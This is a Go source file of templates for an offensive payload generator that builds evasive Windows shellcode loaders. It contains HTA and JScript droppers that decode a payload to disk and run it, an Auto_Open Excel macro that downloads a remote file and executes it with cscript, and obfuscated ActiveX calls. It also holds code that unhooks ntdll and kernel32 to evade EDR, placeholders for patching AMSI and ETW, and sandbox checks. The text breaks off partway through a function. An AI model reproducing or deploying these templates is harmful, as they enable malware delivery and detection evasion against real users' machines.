package Struct

func Sandbox() string {
	return `
	func {{.Variables.IsDomainJoined}}() (bool, error) {
		var {{.Variables.domain}} *uint16
		var {{.Variables.status}} uint32
		err := syscall.NetGetJoinInformation(nil, &{{.Variables.domain}}, &{{.Variables.status}})
		if err != nil {
			return false, err
		}
		syscall.NetApiBufferFree((*byte)(unsafe.Pointer({{.Variables.domain}})))
		return {{.Variables.status}} == syscall.NetSetupDomainName, nil
	}
	`
}

func Sandbox_DomainJoined() string {
	return `
	var {{.Variables.checker}} bool
		{{.Variables.checker}}, _ = {{.Variables.IsDomainJoined}}()
	if {{.Variables.checker}} == true {
	} else {
		os.Exit(3)
	}`
}

func JS_Office_Export() string {
	return `
	//export xlAutoOpen
	func xlAutoOpen() {
		Run()
	}`
}

func JS_Control_Export() string {
	return `
	//export CPlApplet
	func CPlApplet() {
		Run()
	}`
}

func WS_JS_Export() string {
	return `
	//export DllRegisterServer
	func DllRegisterServer() {
		Run()
	}
	
	//export DllGetClassObject
	func DllGetClassObject() {
		Run()
	}
	
	//export DllUnregisterServer
	func DllUnregisterServer() {
		Run()
	}`
}

func WScript_Sandbox() string {
	return `
	var {{.Variables.objShell}} = new ActiveXObject("Shell.Application")
	var {{.Variables.domain}} =  {{.Variables.objShell}}.GetSystemInformation("IsOS_DomainMember");
	if ({{.Variables.domain}} == 0 ){
	}
	else {
		{{.Variables.loader}}
	}	
`
}

func HTA() string {
	return `<HTML>
	<HEAD>
	</HEAD>
	<BODY>
	<script language="javascript" >
	window.resizeTo(0,0);
	{{.Variables.payload}}
	window.close();
	</script>
	</BODY>
	</HTML>
`
}

func HTA_WScript() string {
	return `<HTML>
	<HEAD>
	</HEAD>
	<BODY>
	<script language="javascript" >
	window.resizeTo(0,0);
	try {
		var {{.Variables.RNZyt}} = window.document.location.pathname;
		var {{.Variables.fos}} = new ActiveXObject("Scri"+"pting.FileSy"+"stemObject");
		var {{.Variables.bogusWindows1252Chars}} = "\u20AC\u201A\u0192\u201E\u2026\u2020\u2021\u02C6\u2030\u0160\u2039\u0152\u017D\u2018\u2019\u201C\u201D\u2022\u2013\u2014\u02DC\u2122\u0161\u203A\u0153\u017E\u0178";
		var {{.Variables.correctLatin1Chars}} = "\u0080\u0082\u0083\u0084\u0085\u0086\u0087\u0088\u0089\u008A\u008B\u008C\u008E\u0091\u0092\u0093\u0094\u0095\u0096\u0097\u0098\u0099\u009A\u009B\u009C\u009E\u009F";
		var {{.Variables.obshell}} = new ActiveXObject("Sh"+"ell.App"+"lication");
		var {{.Variables.pathworks}} = new ActiveXObject("Wscri"+"pt.shell");
		var {{.Variables.dest}} = {{.Variables.pathworks}}.ExpandEnvironmentStrings("%TEMP%") + "\\{{.Variables.filename}}";
	 
		function binaryString(str)
		{
			var r = str ? new String(str) : new String();
			r.byteAt = function(index)
			{
				var value = this.charCodeAt(index);
				if (value > 0xff)
				{
					var p = {{.Variables.bogusWindows1252Chars}}.indexOf(this.charAt(index));
					value = {{.Variables.correctLatin1Chars}}.charCodeAt(p);
				}
				var hex = value.toString(16);
				return (hex.length == 2) ? hex : "0" + hex;
			};
			return r;
		}
		function {{.Variables.fromByte}}(hex)
		{
			var c = String.fromCharCode(parseInt(hex, 16));
			var p = {{.Variables.correctLatin1Chars}}.indexOf(c);
			return (p == -1) ? c : {{.Variables.bogusWindows1252Chars}}.charAt(p);
		}
		function {{.Variables.decode}}()
		{
			var {{.Variables.chunkSize}} = 8192;
			var {{.Variables.source}} = "{{.Variables.payload}}";
			var {{.Variables.decodedFile}} = {{.Variables.fos}}.OpenTextFile({{.Variables.dest}}, 2, true); 
			var {{.Variables.hexString}} = {{.Variables.source}};
				var tempArray = new Array();
				for (var i = 0; i < {{.Variables.hexString}}.length; i += 2)
				{
					tempArray[i >> 1] = {{.Variables.fromByte}}({{.Variables.hexString}}.substring(i, i + 2));
				}
				var s = tempArray.join("");
				if (s.length > 0)
				{
					{{.Variables.decodedFile}}.Write(s);
				}
			{{.Variables.decodedFile}}.Close();
		}
	
		function {{.Variables.sleep}}(milliseconds) {
		  var start = new Date().getTime();
		  for (var i = 0; i < 1e7; i++) {
			if ((new Date().getTime() - start) > milliseconds){
			  break;
			}
		  }
		}
		
		{{.Variables.decode}}();
		{{.Variables.obshell}}.ShellExecute("C:\\Windows\\Sysnative\\wscript.exe",""+{{.Variables.dest}}+"","","",0);
		}
		catch (err){
			}
	window.close();
	</script>
	</BODY>
	</HTML>
`
}

func JS_Office_Sub() string {
	return `

	var {{.Variables.fso}} = new ActiveXObject("Scrip"+"ting.FileS"+"ystemObject");
	var {{.Variables.dropPath}} = {{.Variables.fso}}.GetSpecialFolder(2);
	var {{.Variables.objapp}} = new ActiveXObject("{{.Variables.RegName}}.Application");
	{{.Variables.objapp}}.Visible = false;
	var {{.Variables.Application_Version}} = {{.Variables.objapp}}.Version;
	var {{.Variables.WshShell}} = new ActiveXObject("WScript.Shell");
	var {{.Variables.strRegPath}} = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\{{.Variables.RegName}}\\Options\\OPEN";
	var {{.Variables.value}} = ""+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}";
	{{.Variables.WshShell}}.RegWrite({{.Variables.strRegPath}},{{.Variables.value}}, "REG_SZ");
	var {{.Variables.objShell}} = new ActiveXObject("shell.application");     
    {{.Variables.objShell}}.ShellExecute("{{.Variables.ApplicationName}}", "", "", "open", 0);
	WScript.Sleep(40000);
	
	{{.Variables.WshShell}}.RegDelete({{.Variables.strRegPath}});
	{{.Variables.WshShell}}.RegDelete("HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\{{.Variables.RegName}}\\Resiliency\\StartupItems\\");

	`
}

func JS_Control_Sub() string {
	return `
	var {{.Variables.objShell}} = new ActiveXObject("sh"+"ell.applic"+"ation");     
    {{.Variables.objShell}}.ShellExecute({{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", "", 1);
	`
}

func JS_Msiexec_Sub() string {
	return `
	var {{.Variables.objShell}} = new ActiveXObject("she"+"ll.appl"+"ication");     
    {{.Variables.objShell}}.ShellExecute("C:\\Windows\\{{.Variables.System32}}\\msiexec.exe", "/z "+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", 1);
	`
}

func JSfile() string {
	return `
	try {
	

	var {{.Variables.fso}} = new ActiveXObject("Scripti"+"ng.FileSys"+"temObject");
	var {{.Variables.dropPath}} = {{.Variables.fso}}.GetSpecialFolder(2);

    var {{.Variables.base6411}}={ {{.Variables.characters}}:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function({{.Variables.atest}}){ {{.Variables.base6411}}.{{.Variables.characters}};var {{.Variables.rtest}}="",{{.Variables.ctest}}=0;do{var {{.Variables.etest}}={{.Variables.atest}}.charCodeAt({{.Variables.ctest}}++),{{.Variables.ttest}}={{.Variables.atest}}.charCodeAt(c++),{{.Variables.htest}}=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,{{.Variables.rtest}}+={{.Variables.base6411}}.{{.Variables.characters}}.charAt(s)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(A)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(o)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(B)}while(c<a.length);return {{.Variables.rtest}}}};
    function {{.Variables.Magic1}}({{.Variables.rtest}}){if(!/^[a-z0-9+/]+={0,2}$/i.test({{.Variables.rtest}})||{{.Variables.rtest}}.length%4!=0)throw Error("failed");for(var t,e,n,o,i,a,f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",h=[],d=0;d<{{.Variables.rtest}}.length;d+=4)t=(a=f.indexOf({{.Variables.rtest}}.charAt(d))<<18|f.indexOf({{.Variables.rtest}}.charAt(d+1))<<12|(o=f.indexOf({{.Variables.rtest}}.charAt(d+2)))<<6|(i=f.indexOf({{.Variables.rtest}}.charAt(d+3))))>>>16&255,e=a>>>8&255,n=255&a,h[d/4]=String.fromCharCode(t,e,n),64==i&&(h[d/4]=String.fromCharCode(t,e)),64==o&&(h[d/4]=String.fromCharCode(t));return {{.Variables.rtest}}=h.join("")}
    function {{.Variables.binaryWriter}}({{.Variables.res1}},{{.Variables.filename1}})
    {var {{.Variables.base6411}}decoded={{.Variables.Magic1}}({{.Variables.res1}});var {{.Variables.TextStream11}}=new ActiveXObject('A'+'D'+'O'+'D'+'B'+'.'+'S'+'t'+'r'+'e'+'a'+'m');{{.Variables.TextStream11}}.Type=2;{{.Variables.TextStream11}}.charSet='iso-8859-1';{{.Variables.TextStream11}}.Open();{{.Variables.TextStream11}}.WriteText({{.Variables.base6411}}decoded);var {{.Variables.BinaryStream}}=new ActiveXObject('A'+'D'+'O'+'D'+'B'+'.'+'S'+'t'+'r'+'e'+'a'+'m');{{.Variables.BinaryStream}}.Type=1;{{.Variables.BinaryStream}}.Open();{{.Variables.TextStream11}}.Position=0;{{.Variables.TextStream11}}.CopyTo({{.Variables.BinaryStream}});{{.Variables.BinaryStream}}.SaveToFile({{.Variables.filename1}},2);{{.Variables.BinaryStream}}.Close()}

    {{.Variables.dll}}
   
	{{.Variables.binaryWriter}}({{.Variables.dllvar}},{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}");
	{{.Variables.Loader}}


}catch(e) {
}
`
}

func Macro() string {
	return `Sub Auto_Open()
    Dim {{.Variables.pathOfFile}} As String
    Dim {{.Variables.Full}} As String
    Dim {{.Variables.t}} As String
    {{.Variables.pathOfFile}} = Environ("AppData") & "\Microsoft\Excel\"
    VBA.ChDir {{.Variables.pathOfFile}}

    Dim {{.Variables.remoteFile}} As String
    Dim {{.Variables.storeIn}} As String
    Dim {{.Variables.HTTPReq}} As Object

    {{.Variables.remoteFile}} = "{{.Variables.URL}}{{.Variables.outFile}}"
    {{.Variables.storeIn}} = "{{.Variables.outFile}}"
    Set {{.Variables.HTTPReq}} = CreateObject("Microsoft.XMLHTTP")
    {{.Variables.HTTPReq}}.Open "GET", {{.Variables.remoteFile}}, False
    {{.Variables.HTTPReq}}.send

	If {{.Variables.HTTPReq}}.Status = 200 Then
        Set {{.Variables.output}} = CreateObject("ADODB.Stream")
        {{.Variables.output}}.Open
        {{.Variables.output}}.Type = 1
        {{.Variables.output}}.Write {{.Variables.HTTPReq}}.responseBody
        {{.Variables.output}}.SaveToFile {{.Variables.storeIn}}, 2
        {{.Variables.output}}.Close
    End If
    {{.Variables.Full}} = {{.Variables.pathOfFile}} & {{.Variables.storeIn}}
    Set {{.Variables.obj}} = GetObject("new:0006F03A-0000-0000-C000-000000000046")
	{{.Variables.obj}}.CreateObject("WScript.Shell").Run("c" & "s" & "c" & "r" & "i" & "p" & "t" & " //E:jscript " & {{.Variables.Full}}), 0
	{{.Variables.sleep}}
	Kill {{.Variables.Full}}
	End Sub
	Sub {{.Variables.sleep}}()
	Dim when As Variant
		Debug.Print "Start " & Now
		when = Now + TimeValue("00:00:30")
		Do While when > Now
			DoEvents
		Loop
		Debug.Print "End " & Now
	End Sub
`
}

func WS_JS() string {
	return `
	var {{.Variables.manifest}} = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?> <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"> 	<assemblyIdentity type="win32" name="{{.Variables.DLLName}}" version="0.0.0.0"/> 	<file name="{{.Variables.FileName}}.dll">     	<comClass         	description="Description"         	clsid="{89565276-A714-4a43-912E-978B935EDCCC}"         	threadingModel="Both"         	progid="{{.Variables.progid}}"/> 	</file>  </assembly>';    
   
	var {{.Variables.ax}} = new ActiveXObject("Microsoft.Windows.ActCtx");
	{{.Variables.ax}}.ManifestText = {{.Variables.manifest}};
	var {{.Variables.Execute}} = {{.Variables.ax}}.CreateObject("{{.Variables.progid}}");
`
}

func Decrypt_Function() string {
	return `
func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
		{{.Variables.length}} := len({{.Variables.src}})
		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
	}

func {{.Variables.FuncName}}() []byte {	
	{{.Variables.ciphertext}}
	{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})

	{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
	{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")

	{{.Variables.block}}, _ := aes.NewCipher({{.Variables.vkey}})

	{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
	{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
	{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
	{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})

	{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
	{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
	{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
	return {{.Variables.raw_bin}}
}



`
}

func DLL_Refresher() string {
	return `
	package main

	import "C"

	import (
		"debug/pe"
		"encoding/base64"
		{{.Variables.HEX_Import}}
		"[loader]/[loader]"
		"io/ioutil"
		"strconv"
		"syscall"
		"unsafe"
		{{.Variables.SandboxOS}}
		
		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"
	
	)


	const (
		{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		{{.Variables.customsyscall}} uint16
		{{.Variables.customsyscallVP}} uint16
		{{.Variables.number}} int = {{.Variables.b64number}}
	)


	
	{{.Variables.Sandboxfunction}}
	
	func {{.Variables.Versionfunc}}() string {
		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		{{.Variables.Version}}, _, _ :=  {{.Variables.k}}.GetStringValue("CurrentVersion")
		{{.Variables.MV}}, _, err := {{.Variables.k}}.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			{{.Variables.MinV}}, _, _ := {{.Variables.k}}.GetIntegerValue("CurrentMinorVersionNumber")
			{{.Variables.Version}} = strconv.FormatUint({{.Variables.MV}}, 10) + "." + strconv.FormatUint({{.Variables.MinV}}, 10)
		}
		defer {{.Variables.k}}.Close()
				{{.Variables.SyscallNumberlist}}

	}
	
		
	func {{.Variables.loader}}()  {
		err := {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
		if err != nil {
		}
		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
		if err != nil {
		}
		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'}))
		if err != nil {
		}
		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
		if err != nil {
		}
	
	}
	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
		var {{.Variables.decoded}} []byte
			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
		{{.Variables.sum}} := 1
		for i := 1; i < {{.Variables.number}}; i++ {
			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
			{{.Variables.sum}} += i
		}
		return string({{.Variables.decoded}})
	
	}

	{{.Variables.WriteProcessMemory_Function}}

	{{.Variables.ETW_Function}}

	{{.Variables.AMSI_Function}}

	func main() {
	}

	{{.Variables.ExportName}}


	//export Run
	func Run() {
		{{.Variables.Sandbox}}
		{{.Variables.ETW}}
		{{.Variables.AMSI}}
		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
		if {{.Variables.Version}} == "10.0" {
			{{.Variables.loader}}()
		}
		{{.Variables.ETW}}	
		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
		var {{.Variables.phandle}} uint64
		var {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
		{{.Variables.phandle}} = 0xffffffffffffffff
		{{.Variables.regionsizep}} := len({{.Variables.raw_bin}})
		{{.Variables.regionsize}} := uintptr({{.Variables.regionsizep}})
		{{.Variables.protect}} = 0x40
		{{.Variables.alloctype}} = 0x3000
		{{.Variables.ptr}} := [loader].[Allocate]({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
		{{.Variables.buff}}  := (*[1890000]byte)(unsafe.Pointer({{.Variables.ptr}}))
		for x, y := range []byte({{.Variables.raw_bin}}) {
			{{.Variables.buff}} [x] = y
		}
		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0,)
	
	}

	func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
		{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}})
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.DLLname}})
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.x}} := {{.Variables.file}}.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
		{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
		{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
		{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
		{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
		{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
		{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
		var {{.Variables.oldfartcodeperms}} uintptr

		[loader].[NtProtectVirtualMemoryprep](
			{{.Variables.customsyscallVP}}, 
			{{.Variables.handlez}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
			&{{.Variables.regionsize}},
			0x40,
			&{{.Variables.oldfartcodeperms}},
		)

		for i := 0; i < len({{.Variables.bytes}}); i++ {
			{{.Variables.loc}} := uintptr({{.Variables.dllOffset}} + uint(i))
			{{.Variables.mem}} := (*[1]byte)(unsafe.Pointer({{.Variables.loc}}))
			(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
		}
		[loader].[NtProtectVirtualMemoryprep](
			{{.Variables.customsyscallVP}}, 
			{{.Variables.handlez}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
			&{{.Variables.regionsize}},
			0x20,
			&{{.Variables.oldfartcodeperms}},
		)
		return nil
	}
	
`
}

func Binary() string {
	return `
	package main

	import (
		"debug/pe"
		"encoding/base64"
		"time"
		"[loader]/[loader]"
		{{.Variables.HEX_Import}}
		{{.Variables.DebugImport}}
		"io/ioutil"
		"syscall"
		"unsafe"
		"strconv"
		{{.Variables.SandboxOS}}

		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"

	)


	{{.Variables.Debug}}

	const (
		{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (

		{{.Variables.customsyscall}} uint16
		{{.Variables.customsyscallVP}} uint16
		{{.Variables.number}} int = {{.Variables.b64number}}
	)

	
	{{.Variables.Sandboxfunction}}


	func {{.Variables.Console}}(show bool) {
		{{.Variables.getWin}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.GetConsoleWindowName}}"))
		{{.Variables.showWin}} := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.ShowWindowName}}"))
		{{.Variables.hwnd}}, _, _ := {{.Variables.getWin}}.Call()
		if {{.Variables.hwnd}} == 0 {
			return
		}
		if show {
		var {{.Variables.SW_RESTORE}} uintptr = 9
		{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_RESTORE}})
		} else {
		var {{.Variables.SW_HIDE}} uintptr = 0
		{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
		}
	}
	
	func {{.Variables.Versionfunc}}() string {
		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		{{.Variables.Version}}, _, _ :=  {{.Variables.k}}.GetStringValue("CurrentVersion")
		{{.Variables.MV}}, _, err := {{.Variables.k}}.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			{{.Variables.MinV}}, _, _ := {{.Variables.k}}.GetIntegerValue("CurrentMinorVersionNumber")
			{{.Variables.Version}} = strconv.FormatUint({{.Variables.MV}}, 10) + "." + strconv.FormatUint({{.Variables.MinV}}, 10)
		}
		defer {{.Variables.k}}.Close()
		{{.Variables.VersionMessage}}
			{{.Variables.SyscallNumberlist}}

	}
	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
		var {{.Variables.decoded}} []byte
			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
		{{.Variables.sum}} := 1
		for i := 1; i < {{.Variables.number}}; i++ {
			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
			{{.Variables.sum}} += i
		}
		return string({{.Variables.decoded}})
	
	}

	{{.Variables.WriteProcessMemory_Function}}

	{{.Variables.ETW_Function}}

	{{.Variables.AMSI_Function}}
	
	func {{.Variables.loader}}()  {
		err := {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
		if err != nil {
			{{.Variables.RefreshPE}}
		}
		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
		if err != nil {
			{{.Variables.RefreshPE}}
		}
		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'}))
		if err != nil {
			{{.Variables.RefreshPE}}
		}
		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
		if err != nil {
			{{.Variables.RefreshPE}}
		}
		{{.Variables.EDR}}
	
	}
	
	
	func main() {
		{{.Variables.Sandbox}}
		{{.Variables.ETW}}
		{{.Variables.AMSI}}
		time.Sleep({{.Variables.SleepSecond}} * time.Millisecond)
		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
		if {{.Variables.Version}} == "10.0" {
			{{.Variables.loader}}()
		}
		{{.Variables.ETW}}
		{{.Variables.hide}}
		{{.Variables.Pointer}}
		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
		{{.Variables.ShellcodeString}}
		{{.Variables.ptr}} := func() {
		}
		var {{.Variables.oldptrperms}} uintptr
		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
		{{.Variables.regionsize}} := uintptr(len({{.Variables.raw_bin}}))
		var {{.Variables.oldfartcodeperms}} uintptr
		{{.Variables.runfunc}}, _ := [loader].[NtProtectVirtualMemoryprep](
			{{.Variables.customsyscallVP}}, 
			{{.Variables.handle}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
			&{{.Variables.regionsize}},
			0x40,
			&{{.Variables.oldptrperms}},
		)
		if {{.Variables.runfunc}} != 0 {
			panic("Call to VirtualProtect failed!")
		}
		{{.Variables.CopyPointer}}
		*(**uintptr)(unsafe.Pointer(&{{.Variables.ptr}})) = (*uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}}))
		{{.Variables.OverwrittenShellcode}}
	
		{{.Variables.OverWrittenPoint}}
		{{.Variables.runfunc}}, _ = [loader].[NtProtectVirtualMemoryprep](
			{{.Variables.customsyscallVP}}, 
			{{.Variables.handle}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}})),
			&{{.Variables.regionsize}},
			0x40,
			&{{.Variables.oldfartcodeperms}},
		)
		if {{.Variables.runfunc}} != 0 {
			panic("Call to VirtualProtect failed!!!!!")
		}
		syscall.Syscall(**(**uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),0, 0, 0, 0,)

	
	}
	func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
		{{.Variables.ReloadingMessage}}
		{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}})
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.DLLname}})
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.x}} := {{.Variables.file}}.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
		{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
		{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
		{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
		{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
		{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
		{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
		var {{.Variables.oldfartcodeperms}} uintptr

		{{.Variables.runfunc}}, _ := [loader].[NtProtectVirtualMemoryprep](
			{{.Variables.customsyscallVP}}, 
			{{.Variables.handlez}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
			&{{.Variables.regionsize}},
			0x40,
			&{{.Variables.oldfartcodeperms}},
		)
		if {{.Variables.runfunc}} != 0 {
		}
		for i := 0; i < len({{.Variables.bytes}}); i++ {
			{{.Variables.loc}} := uintptr({{.Variables.dllOffset}} + uint(i))
			{{.Variables.mem}} := (*[1]byte)(unsafe.Pointer({{.Variables.loc}}))
			(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
		}
		{{.Variables.runfunc}}, _ = [loader].[NtProtectVirtualMemoryprep](
			{{.Variables.customsyscallVP}}, 
			{{.Variables.handlez}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
			&{{.Variables.regionsize}},
			{{.Variables.oldfartcodeperms}},
			&{{.Variables.oldfartcodeperms}},
		)
		return nil
	}
`
}

func DLL() string {
	return `
	package main

	import "C"

	import (
		"encoding/base64"
		{{.Variables.HEX_Import}}
		"[loader]/[loader]"
		"strconv"
		"syscall"
		"unsafe"
		{{.Variables.SandboxOS}}
		
		{{.Variables.Windows_Import}}
		"golang.org/x/sys/windows/registry"
	
	)

	const (
		{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		{{.Variables.customsyscall}} uint16
		{{.Variables.customsyscallVP}} uint16
		{{.Variables.number}} int = {{.Variables.b64number}}
	)


	{{.Variables.Sandboxfunction}}

	func {{.Variables.Versionfunc}}() {
		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		{{.Variables.Version}}, _, _ :=  {{.Variables.k}}.GetStringValue("CurrentVersion")
		{{.Variables.MV}}, _, err := {{.Variables.k}}.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			{{.Variables.MinV}}, _, _ := {{.Variables.k}}.GetIntegerValue("CurrentMinorVersionNumber")
